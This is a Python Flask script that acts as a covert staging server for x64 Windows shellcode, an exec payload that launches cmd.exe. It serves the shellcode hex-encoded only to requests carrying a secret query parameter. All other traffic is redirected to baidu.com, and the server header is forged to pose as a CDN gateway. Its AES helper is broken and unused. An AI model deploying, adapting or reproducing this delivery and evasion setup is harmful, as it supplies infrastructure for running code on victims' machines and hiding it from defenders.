from flask import jsonify
from flask import request
#from Crypto.Cipher import AES
from flask import make_response
import os
from flask import Flask, render_template, request, redirect
import base64
app = Flask(__name__)

shellcode = (
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51"
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed"
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49"
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a"
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65"
"\x78\x65\x00"
)

def AES_Encrypt(key):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
    unpad = lambda s : s[0:-ord(s[-1])]

    key = key # the length can be (16, 24, 32)
    vi = '0000000000000000'
    text = 'xxxx'
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))

    encrypted = cipher.encrypt(pad(text)).encode('hex')
    return str(encrypted)


@app.errorhandler(404)
def miss(e):
    return redirect("http://baidu.com")

@app.errorhandler(500)
def error(e):
    return redirect("http://baidu.com")


@app.route('/', methods=['GET'])
def GetKey():
    key=request.args.get('shellcode')
    if (key == '1'):
        if not key:
            return redirect("http://baidu.com")
        else:
            resp = make_response(shellcode.encode('hex'))
            resp.headers['server'] = 'stgw/1.3.12.4_1.13.5'
            return resp
    else:
        return redirect("http://baidu.com")


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80, debug=False)